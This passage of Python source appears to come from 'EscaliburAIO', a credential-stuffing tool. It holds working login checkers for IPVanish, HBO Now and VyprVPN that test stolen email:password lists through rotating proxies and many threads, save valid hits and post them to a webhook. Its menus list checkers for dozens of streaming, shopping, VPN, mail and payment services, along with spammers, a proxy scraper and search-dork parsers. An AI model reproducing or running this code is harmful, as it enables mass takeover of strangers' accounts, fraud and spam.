                    "Sec-Fetch-User":"?1",
                    "Sec-Fetch-Dest":"document",
                    "Referer":"https://account.ipvanish.com/login",
                    "Accept-Language":"en-US,en;q=0.9",
                    "Cookie":"SC_session=3526172ae748030; __ssid=9a5e906dfdf3a151868863193ad575a; PHPSESSID=4jtdt937vihds34dieg2gqp686",
                    "Accept-Encoding":"gzip, deflate",
                    "Content-Length":"116"
                }

                r = sess.post("https://account.ipvanish.com/login/validate", data=content, headers=headers, allow_redirects=True)
                if "Sorry, invalid credentials." or "reactivate your service" in r.text:
                    bad+=1
                    checked+=1
                    cpm+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))

                elif "Account Status:" in r.text:
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))

                    good+=1
                    checked+=1
                    cpm+=1
                else:
                    threading.Thread(target=IpVanish_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            pass
    def IpVanish():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="IPVanish"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=IpVanish_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def HBONow_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                headers = {
                    "Content-Type":"application/json", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",  
                    "Pragma":"no-cache",  
                    "Accept":"application/vnd.hbo.v9.full+json",  
                    "Host":"comet.api.hbo.com",  
                    "Connection":"keep-alive",  
                    "Content-Length":"295",  
                    "X-B3-TraceId":"e99addde-22b3-40f8-9688-ac274b615cf1-b2cfdcbc-736b-4e1e-fe57-f9144807c294",  
                    "Accept-Language":"en-us",  
                    "X-Hbo-Client-Version":"Hadron/15.1.0.7 desktop (DESKTOP)",  
                    "Referer":"https://play.hbonow.com/" 
                }

                content = {"client_id":"88a4f3c6-f1de-42d7-8ef9-d3b00139ea6a","client_secret":"88a4f3c6-f1de-42d7-8ef9-d3b00139ea6a","scope":"browse video_playback_free","grant_type":"client_credentials","deviceSerialNumber":"27ea8f9a-c987-44d7-bb3e-6c4d741f0b09","clientDeviceData":{"paymentProviderCode":"blackmarket"}}

                f = sess.post("https://comet.api.hbo.com/tokens", headers=headers, json=content)

                token = search(r'"access_token"":""(.*?)"', str(f.text)).group(1)

                content = {"grant_type":"user_name_password","scope":"browse video_playback device elevated_account_management","username":f"{email}","password":f"{password}"}

                headers = {
                    "Content-Type":"application/json",
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "Accept":"application/vnd.hbo.v9.full+json", 
                    "Host":"comet.api.hbo.com", 
                    "Connection":"keep-alive", 
                    "Content-Length":"161", 
                    "X-B3-TraceId":"e99addde-22b3-40f8-9688-ac274b615cf1-9948e55f-f414-4a17-de05-50701037cbab", 
                    "Accept-Language":"en-us", 
                    "X-Hbo-Client-Version":"Hadron/15.1.0.7 desktop (DESKTOP)", 
                    "Referer":"https://play.hbonow.com/", 
                    "Authorization":f"Bearer {token}" 
                }

                r = sess.post("https://comet.api.hbo.com/tokens", headers=headers, json=content)

                if "invalid_credentials" in r.text:
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    bad+=1
                    checked+=1
                    cpm+=1
                elif "access_token" in r.text:
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    good+=1
                    checked+=1
                    cpm+=1
                else:
                    threading.Thread(target=HBONow_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=HBONow_check, args=(emails, passwords, proxylist,)).start()
    def HBONow():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="HBONow"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=HBONow_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def VyprVPN_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "https://api.goldenfrog.com/settings" 
                headers = {
                    "Host": "api.goldenfrog.com",
                    "X-GF-PLATFORM-VERSION": "12.0.1",
                    "X-API-Features": "partial_sign_up;",
                    "X-GF-PRODUCT": "VyprVPN",
                    "Accept": "*/*",
                    "X-GF-PLATFORM": "iOS",
                    "locale": "de_DE",
                    "X-GF-DEVICE-NAME": "iPhone",
                    "password": f"{password}",
                    "X-API-Version": "2",
                    "username": f"{email}",
                    "User-Agent": "VyprVPN/7327 CFNetwork/974.2.1 Darwin/18.0.0",
                    "Connection": "keep-alive",
                    "X-GF-PRODUCT-VERSION": "3.0.0.7327",
                    "X-GF-Agent": "VyprVPN iOS 3.0.0.7327 (21a2ef40)" 
                }
                r = sess.get(url, headers=headers)
                if "confirmed\": true" in r.text:
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))

                    good+=1
                    checked+=1
                    cpm+=1
                elif "invalid username or password" in r.text:
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))

                    bad+=1
                    checked+=1
                    cpm+=1
                else:
                    threading.Thread(target=VyprVPN_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=VyprVPN_check, args=(emails, passwords, proxylist,)).start()
    def VyprVPN():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="VyprVPN"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=VyprVPN_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1
    def ZenmateVPN():
        print("This option is off..")
        time.sleep(2)
        menu()

    def textedit():
        global username
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")

        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print(" Hello {}, where do you want to go?\n".format(username))
        print(" [1] Editor")
        print(" [2] Email:Pass -> User:Pass")
        print(" [3] Username Filter")
        print(" [4] Dupe Remover")
        print(" [5] Capitalize Password")
        print(" [6] Add Word After Password")
        print(" [7] Swap Password With Email (before domain)")
        print(" [8] Email:Password -> Password:Email")
        print(" [9] Change ':' with other character")
        print(" [10] Capitalize Email")
        print(" [11] User:Pass to Email:Pass")
        print(" [12] Menu")
        try:
            alegere = int(input(""))
        except ValueError:
            print(" Not an integer!")
            time.sleep(2)
            os._exit(0)
        if alegere == 1:
            edit1()
            save(final)
        elif alegere == 2:
            edit2()
            save(final)
        elif alegere == 3:
            edit3()
            save(final)
        elif alegere == 4:
            edit4()
            save(final)
        elif alegere == 5:
            edit5()
            save(final)
        elif alegere == 6:
            edit6()
            save(final)
        elif alegere == 7:
            edit7()
            save(final)
        elif alegere == 8:
            edit8()
            save(final)
        elif alegere == 9:
            edit9()
            save(final)
        elif alegere == 10:
            edit10()
            save(final)
        elif alegere == 11:
            edit11()
            save(final)
        elif alegere == 12:
            menu()
        else:
            print("invalid input..")
            time.sleep(2)
            menu()

    def modules_names():
        global username
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"\n".format(random.choice(lista_mesaje)))
        print(" Gaming [1]\n Streaming [2]\n Shopping [3]\n Porn [4]\n Vpn [5]\n Mail Checker [6]\n Food [7]\n Education [8]\n File Hosting [9]\n Money [10]\n Menu [11]")
        alegere = input(" ")
        if alegere == "1": 
            os.system("cls")
            ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
            print("\n" + logo + "\n")
            print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
            print("\n Origin [1]\n uPlay [OFF] [2]\n Valorant [3]\n Steam [OFF] [4]\n Blizzard [OFF] [5]\n Minecarft [6]\n EpicGames [7]\n LoL - NA [8]\n Gamefly [9]\n RazerGold [10]\n Vortex.gg [11]\n Menu [12]") 
            alegere_game = input(" ") 
            if alegere_game == "1": 
                load_accounts()
                load_proxies()
                Origin() 
            elif alegere_game == "2": 
                load_accounts()
                load_proxies()
                uPlay() 
            elif alegere_game == "3": 
                load_accounts()
                load_proxies()
                Valorant() 
            elif alegere_game == "4": 
                load_accounts()
                load_proxies()
                Steam() 
            elif alegere_game == "5": 
                load_accounts()
                load_proxies()
                Blizzard() 
            elif alegere_game == "6":
                load_accounts()
                load_proxies()
                Minecraft()
            elif alegere_game == "7": 
                load_accounts()
                load_proxies()
                EpicGames()
            elif alegere_game == "8":
                load_accounts()
                load_proxies()
                lol_na()
            elif alegere_game == "9":
                load_accounts()
                load_proxies()
                gamefly()
            elif alegere_game == "10":
                load_accounts()
                load_proxies()
                razergold()
            elif alegere_game == "11":
                load_accounts()
                load_proxies()
                vortex()
            elif alegere_game == "12":
                menu()
            else: 
                print(" Invalid input..") 
                time.sleep(2) 
                modules_names()
        elif alegere == "9":
            os.system("cls")
            ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
            print("\n" + logo + "\n")
            print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
            print("\n Anonfile [1]\n ZippyShare [2]\n Fileupload [3]\n Menu [4]")   
            alegere_x = input(" ")
            if alegere_x == "1":
                load_accounts()
                load_proxies()
                anonfile()
            elif alegere_x == "2":
                load_accounts()
                load_proxies()
                zippyshare()
            elif alegere_x == "3":
                load_accounts()
                load_proxies()
                fileupload()
            elif alegere_x == "4":
                menu()
            else:
                print(" Invalid input..") 
                time.sleep(2) 
                modules_names()  
        elif alegere == "7":
            os.system("cls")
            ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
            print("\n" + logo + "\n")
            print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
            print("\n JustEat UK [1]\n Tesco [2]\n Wendy [3]\n Buffalo Wild Wings [4]\n Foodora [5]\n MC Donalds [6]\n Menu [7]")   
            alegere_x = input(" ")
            if alegere_x == "1":
                load_accounts()
                load_proxies()
                just_eat_uk()
            elif alegere_x == "2":
                load_accounts()
                load_proxies()
                tesco()
            elif alegere_x == "3":
                load_accounts()
                load_proxies()
                wendy()
            elif alegere_x == "4":
                load_accounts()
                load_proxies()
                bufallo()
            elif alegere_x == "5":
                load_accounts()
                load_proxies()
                foodora()
            elif alegere_x == "6":
                load_accounts()
                load_proxies()
                mcdonald()
            elif alegere_x == "7":
                menu()
            else:
                print(" Invalid input..") 
                time.sleep(2) 
                modules_names()  
        elif alegere == "8":
            os.system("cls")
            ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
            print("\n" + logo + "\n")
            print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
            print("\n Grammarly [1]\n Quizizz\n SkillShare [3]\n Menu [4]")   
            alegere_x = input(" ")
            if alegere_x == "1":
                load_accounts()
                load_proxies()
                grammarly()
            elif alegere_x == "2":
                load_accounts()
                load_proxies()
                quizizz()
            elif alegere_x == "3":
                load_accounts()
                load_proxies()
                skillshare()
            elif alegere_x == "4":
                menu()
            else:
                print(" Invalid input..") 
                time.sleep(2) 
                modules_names()    
        elif alegere == "2":
            os.system("cls")
            ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
            print("\n" + logo + "\n")
            print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
            print("\n Hulu [1]\n Netflix [2]\n Spotify [3]\n Disney+ [OFF] [4]\n DirectTV [5]\n CrunchyRoll [6]\n DAZN [7]\n Funimation [8]\n HBOnow [9]\n NBA [10]\n WWE [11]\n Pandora [12]\n Plex [13]\n Silver.tv [14]\n Napster [15]\n Deezer [16]\n FuboTV [17]\n Tidal [18]\n MyCanal [19]\n Menu [20]") 
            alegere_streaming = input(" ") 
            if alegere_streaming == "1": 
                load_accounts()
                load_proxies()
                Hulu() 
            elif alegere_streaming == "2": 
                load_accounts()
                load_proxies()
                Netflix() 
            elif alegere_streaming == "3": 
                load_accounts()
                load_proxies()
                Spotify() 
            elif alegere_streaming == "4": 
                load_accounts()
                load_proxies()
                Disney() 
            elif alegere_streaming == "5": 
                load_accounts()
                load_proxies()
                DirectTV() 
            elif alegere_streaming == "6": 
                load_accounts()
                load_proxies()
                Crunchyroll()
            elif alegere_streaming == "7":
                load_accounts()
                load_proxies()
                DAZN()
            elif alegere_streaming == "8":
                load_accounts()
                load_proxies()
                Funimation()
            elif alegere_streaming == "9":
                load_accounts()
                load_proxies()
                HBONow()
            elif alegere_streaming == "10":
                load_accounts()
                load_proxies()
                NBA()
            elif alegere_streaming == "11":
                load_accounts()
                load_proxies()
                WWE()
            elif alegere_streaming == "12":
                load_accounts()
                load_proxies()
                Pandora()
            elif alegere_streaming == "13":
                load_accounts()
                load_proxies()
                Plex()
            elif alegere_streaming == "14":
                load_accounts()
                load_proxies()
                silvertv()
            elif alegere_streaming == "15":
                load_accounts()
                load_proxies()
                napster()
            elif alegere_streaming == "16":
                load_accounts()
                load_proxies()
                deezer()
            elif alegere_streaming == "17":
                load_accounts()
                load_proxies()
                fubotv()
            elif alegere_streaming == "18":
                load_accounts()
                load_proxies()
                tidal()
            elif alegere_streaming == "19":
                load_accounts()
                load_proxies()
                mycanal()
            elif alegere_streaming == "20":
                menu()
            else: 
                print(" Invalid input..") 
                time.sleep(2) 
                modules_names()  
        elif alegere == "3":
            os.system("cls")
            ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
            print("\n" + logo + "\n")
            print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
            print("\n Amazon [1]\n eBay [OFF] [2]\n Wish [3]\n GetUpside [4]\n Academy [5]\n Adguard [6]\n Bath & Body Works [7]\n FitBit [8]\n Floatplane [9]\n Foot Asylum [10]\n Go Daddy [11]\n GitHub [12]\n Groupon [13]\n Imeipro [14]\n Imgur [15]\n Imvu [16]\n Instagram [17]\n Lush [18]\n Ovh-fr [19]\n Paysafecard [20]\n Perfumeshop [21]\n Pretachanger [22]\n RDPzone [23]\n Shell Rewards [24]\n Shutterstock [25]\n StockX [26]\n SuperDrug [27]\n TheBodyShop [28]\n Victoria Secret [29]\n AdFocus [30]\n Adidas [31]\n AmazingRDP [32]\n Dollar.gg [33]\n Points Prizes [34]\n Reddit [35]\n Luminati [36]\n Menu [37]") 
            alegere_streaming = input(" ") 
            if alegere_streaming == "1": 
                load_accounts()
                load_proxies()
                Amazon()
            elif alegere_streaming == "2": 
                load_accounts()
                load_proxies()
                eBay()
            elif alegere_streaming == "3": 
                load_accounts()
                load_proxies()
                Wish()
            elif alegere_streaming == "4": 
                load_accounts()
                load_proxies()
                GetUpside()
            elif alegere_streaming == "5":
                load_accounts()
                load_proxies()
                Academy()
            elif alegere_streaming == "6":
                load_accounts()
                load_proxies()
                ADGuard()
            elif alegere_streaming == "7":
                load_accounts()
                load_proxies()
                bathandbody()
            elif alegere_streaming == "8":
                load_accounts()
                load_proxies()
                fitbit()
            elif alegere_streaming == "9":
                load_accounts()
                load_proxies()
                floatplane()
            elif alegere_streaming == "10":
                load_accounts()
                load_proxies()
                foot_asylum()
            elif alegere_streaming == "11":
                load_accounts()
                load_proxies()
                godaddy()
            elif alegere_streaming == "12":
                load_accounts()
                load_proxies()
                github()
            elif alegere_streaming == "13":
                load_accounts()
                load_proxies()
                groupon()
            elif alegere_streaming == "14":
                load_accounts()
                load_proxies()
                imeipro()
            elif alegere_streaming == "15":
                load_accounts()
                load_proxies()
                imgur()
            elif alegere_streaming == "16":
                load_accounts()
                load_proxies()
                imvu()
            elif alegere_streaming == "17":
                load_accounts()
                load_proxies()
                instagram()
            elif alegere_streaming == "18":
                load_accounts()
                load_proxies()
                lush()
            elif alegere_streaming == "19":
                load_accounts()
                load_proxies()
                ovh_fr()
            elif alegere_streaming == "20":
                load_accounts()
                load_proxies()
                paysafecard()
            elif alegere_streaming == "21":
                load_accounts()
                load_proxies()
                perfumeshop()
            elif alegere_streaming == "22":
                load_accounts()
                load_proxies()
                pretachanger()
            elif alegere_streaming == "23":
                load_accounts()
                load_proxies()
                rdpzone()
            elif alegere_streaming == "24":
                load_accounts()
                load_proxies()
                shellrewards()
            elif alegere_streaming == "25":
                load_accounts()
                load_proxies()
                shutterstock()
            elif alegere_streaming == "26":
                load_accounts()
                load_proxies()
                stocx()
            elif alegere_streaming == "27":
                load_accounts()
                load_proxies()
                superdrug()
            elif alegere_streaming == "28":
                load_accounts()
                load_proxies()
                thebodyshop()
            elif alegere_streaming == "29":
                load_accounts()
                load_proxies()
                victoriasecret()
            elif alegere_streaming == "30":
                load_accounts()
                load_proxies()
                adfocus()
            elif alegere_streaming == "31":
                load_accounts()
                load_proxies()
                adidas()
            elif alegere_streaming == "32":
                load_accounts()
                load_proxies()
                amazingrdp()
            elif alegere_streaming == "33":
                load_accounts()
                load_proxies()
                dollargg()
            elif alegere_streaming == "34":
                load_accounts()
                load_proxies()
                pointsprizes()
            elif alegere_streaming == "35":
                load_accounts()
                load_proxies()
                reddit()
            elif alegere_streaming == "36":
                load_accounts()
                load_proxies()
                luminati()
            elif alegere_streaming == "37":
                menu()
            else: 
                print(" Invalid input..") 
                time.sleep(2) 
                modules_names() 
        elif alegere == "4":
            os.system("cls")
            ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
            print("\n" + logo + "\n")
            print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
            print("\n Brazzers [1]\n Chaturbate [OFF] [2]\n RealityKings [OFF] [3]\n BangBros [4]\n Propertysex [OFF] [5]\n PornPortal [6]\n Camarads [7]\n Menu [8]") 
            alegere_streaming = input(" ") 
            if alegere_streaming == "1": 
                load_accounts()
                load_proxies()
                Brazzers() 
            elif alegere_streaming == "2": 
                load_accounts()
                load_proxies()
                Chaturbate() 
            elif alegere_streaming == "3": 
                load_accounts()
                load_proxies()
                RealityKings() 
            elif alegere_streaming == "4": 
                load_accounts()
                load_proxies()
                BangBros() 
            elif alegere_streaming == "5": 
                load_accounts()
                load_proxies()
                Propertysex()
            elif alegere_streaming == "6":
                load_accounts()
                load_proxies()
                PornPortal()
            elif alegere_streaming == "7":
                load_accounts()
                load_proxies()
                camarads()
            elif alegere_streaming == "8":
                menu()
            else: 
                print(" Invalid input..") 
                time.sleep(2) 
                modules_names()  
        elif alegere == "5":
            os.system("cls")
            ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
            print("\n" + logo + "\n")
            print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
            print("\n TunnelBear [1]\n NordVPN [2]\n HMA [3]\n IpVanish [4]\n VyprVPN [5]\n ZenmateVPN [6]\n ExpressVPN [7]\n X-VPN [8]\n IvacyVPN [9]\n Menu [10]") 
            alegere_streaming = input(" ") 
            if alegere_streaming == "1": 
                load_accounts()
                load_proxies()
                TunnelBear() 
            elif alegere_streaming == "2": 
                load_accounts()
                load_proxies()
                NordVPN()  
            elif alegere_streaming == "3": 
                load_accounts()
                load_proxies()
                HMA() 
            elif alegere_streaming == "4": 
                load_accounts()
                load_proxies()
                IpVanish() 
            elif alegere_streaming == "5": 
                load_accounts()
                load_proxies()
                VyprVPN()
            elif alegere_streaming == "6":
                load_accounts()
                load_proxies()
                ZenmateVPN() 
            elif alegere_streaming == "7":
                load_accounts()
                load_proxies()
                ExpressVPN()
            elif alegere_streaming == "8":
                load_accounts()
                load_proxies()
                XVPN()
            elif alegere_streaming == "9":
                load_accounts()
                load_proxies()
                ivacy_vpn()
            elif alegere_streaming == "10":
                menu()
            else: 
                print(" Invalid input..") 
                time.sleep(2) 
                modules_names()  
        elif alegere == "6":
            os.system("cls")
            ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
            print("\n" + logo + "\n")
            print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
            print("\n Mail Access Checker [1]\n Abv.bg [2]\n Yahoo [3]\n Menu [4]") 
            alegere_s = input(" ")
            if alegere_s == "1":
                load_accounts()
                load_proxies()
                Mail_Access() 
            elif alegere_s == "2":
                load_accounts()
                load_proxies()
                AbvBG()
            elif alegere_s == "3":
                load_accounts()
                load_proxies()
                Yahoo()
            elif alegere_s == "4":
                menu()
            else:
                print("Invalid input..")
                time.sleep(2)
                modules_names()
        elif alegere == "10":
            os.system("cls")
            ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
            print("\n" + logo + "\n")
            print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
            print("\n Venmo [1]\n Menu [2]")
            alegere = input(' ')
            if alegere == "1":
                load_accounts()
                load_proxies()
                venmo()
            elif alegere == "2":
                menu() 
            else:
                print(' Invalid input..')
                time.sleep(2)
                menu()
        elif alegere == "11":
            menu()
        else:
            print("Invalid input..")
            time.sleep(2)
            modules_names()  
    def proxy_scraper_mesaj():
        if os.path.exists('https.txt'):
            os.remove('https.txt')
        if os.path.exists('socks4.txt'):
            os.remove('socks4.txt')
        if os.path.exists('socks5.txt'):
            os.remove('socks5.txt')
        if os.path.exists('alltypes.txt'):
            os.remove('alltypes.txt')
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print()
        print(logo)
        print()
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print("  What type of proxies you want to use?")
        print()
        print("  [1] Http/s")
        print("  [2] Socks4")
        print("  [3] Socks5")
        print("  [4] All Types")
        print("  [5] Menu")
        alegere_scraper = input("  ")
        if alegere_scraper == "1":
            open("https.txt", "a")
            httpsproxies = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all")
            with open("https.txt", "wb") as f:
                f.write(httpsproxies.content)
            proxy_scraper_mesaj()
        elif alegere_scraper == "2":
            open("socks4.txt", "a")
            socks4proxies = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=10000&country=all&ssl=all&anonymity=all")
            with open("socks4.txt", "wb") as f:
                f.write(socks4proxies.content)
            proxy_scraper_mesaj()
        elif alegere_scraper == "3":
            open("socks5.txt", "a")
            socks5proxies = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all&ssl=all&anonymity=all")
            with open("socks5.txt", "wb") as f:
                f.write(socks5proxies.content)
            proxy_scraper_mesaj()
        elif alegere_scraper == "4":
            open("alltypes.txt", "a")
            alltypes = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=all&timeout=10000&country=all&ssl=all&anonymity=all")
            with open("alltypes.txt", "wb") as f:
                f.write(alltypes.content)
            proxy_scraper_mesaj()
        elif alegere_scraper == "5":
            menu()
        else:
            print("  Invalid input..")
            time.sleep(1)
            sys.exit()
    def menu():
        global username
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO - Best AIO")
        print()
        print(logo)
        print()
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {},where do you want to go?".format(username))
        print()
        print(" [1] Modules")
        print(" [2] Proxy tools")
        print(" [3] Combo Editor")
        print(" [4] Spammers")
        print(" [5] Parsers")
        print(" [6] Support")
        print(" [7] Settings")
        print(" [8] KeyWord Generator")
        print(' [9] AntiPublic')
        print(" [10] Quit")
        alegere_menu = input(" ")
        if alegere_menu == "1":
            modules_names()
        elif alegere_menu == "2":
            os.system("cls")
            ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO - Best AIO")
            print()
            print(logo)
            print()
            print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
            print()
            print(" Hello, {},where do you want to go?".format(username))
            print("\n [1] Proxy scraper")
            print(" [2] Proxy checker")
            print(" [3] Menu")
            alegere = input(" ")
            if alegere == "1":      
                proxy_scraper_mesaj()
            elif alegere == "2":
                load_proxies()
                proxy_check()
            elif alegere == "3":
                menu()
            else:
                print(" Invalid input..")
                time.sleep(2)
                menu()
        elif alegere_menu == "3":
            load_accounts()
            textedit()
        elif alegere_menu == "4":
            os.system("cls")
            ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO - Best AIO")
            print()
            print(logo)
            print()
            print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
            print()
            print(" Hello, {},where do you want to go?".format(username))
            print("\n [1] Discord Spammer")
            print(" [2] Webhook Spammer")
            print(" [3] Email Spammer")
            print(" [3] Menu")
            alegere = input(" ")
            if alegere == "1":      
                spammer_check()
            elif alegere == "2":
                webhook_start()
            elif alegere == "3":
                email_spammer()
            elif alegere == "4":
                menu()
            else:
                print(" Invalid input..")
                time.sleep(2)
                menu()
        elif alegere_menu == "5":
            os.system("cls")
            ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO - Best AIO")
            print()
            print(logo)
            print()
            print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
            print()
            print(" Hello, {},where do you want to go?".format(username))
            print("\n [1] Google")
            print(" [2] Bing")
            print(" [3] Aol")
            print(" [4] Yahoo")
            print(" [5] MyWebSearch")
            print(" [6] Yandex")
            print(" [7] Menu")
            alegere = input(" ")
            if alegere == "1":
                load_dorks()
                load_proxies()
                dork_check()
            elif alegere == "2":
                load_dorks()
                load_proxies()
                dork_bing_check() 
            elif alegere == "3":
                load_dorks()
                load_proxies()
                dork_aol_check()       
            elif alegere == "4":   
                load_dorks()
                load_proxies()
                dork_yahoo_check()  
            elif alegere == "5":
                load_dorks()
                load_proxies()
                dork_mywebsearch_check()  
            elif alegere == "6":
                load_dorks()
                load_proxies()
                dork_yandex_check() 
            elif alegere == "7":
                menu()
        elif alegere_menu == "6":
            webbrowser.open_new("https://discord.gg/kxbSgFM")
            menu()    
        elif alegere_menu == "7":
